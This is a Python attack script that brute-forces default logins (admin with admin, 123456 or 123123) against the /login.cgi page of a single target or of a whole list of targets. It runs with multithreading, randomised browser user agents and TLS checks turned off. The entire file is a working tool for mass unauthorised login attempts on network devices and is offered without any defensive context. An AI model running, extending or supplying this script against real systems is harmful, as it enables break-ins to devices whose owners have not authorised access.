import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]


def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


def fuzz(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc +'/login.cgi'
	username=['admin']
	password=['admin','123456','123123']
	for i in username:
		for j in password:
			data={
			"user":i,
			"password":j,
			#"server":"1",
			}
			try:
				headers = {'User-Agent': get_ua()}
				r=requests.post(url1,headers=headers,data=data,verify=False,allow_redirects=True,timeout=10)
				if 'index.htm?_' in r.text:
					print('\033[32m[+]%s Login Success！ username:%s&password:%s\033[0m' %(url1,i,j))
					#登录成功退出
					break
				else :
					print('\033[31m[-]%s Login False\033[0m' %url1)
			except Exception as e:
				print('[!]%s is timeout' %url1)
				#登录超时退出
				break


def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(fuzz, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':

	arg = ArgumentParser(description='By houlang')
	arg.add_argument("-u",
					 "--url",
					 help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
					 "--file",
					 help="Target URL; Example:url.txt")
	args = arg.parse_args()
	url = args.url
	filename = args.file
	start = time()
	if url != None and filename == None:
		fuzz(url)
	elif url == None and filename != None:
		for i in open(filename):
			i = i.replace('\n', '')
			url_list.append(i)
		multithreading(url_list, 10)
	end = time()
	print('任务完成，用时%d' % (end - start))
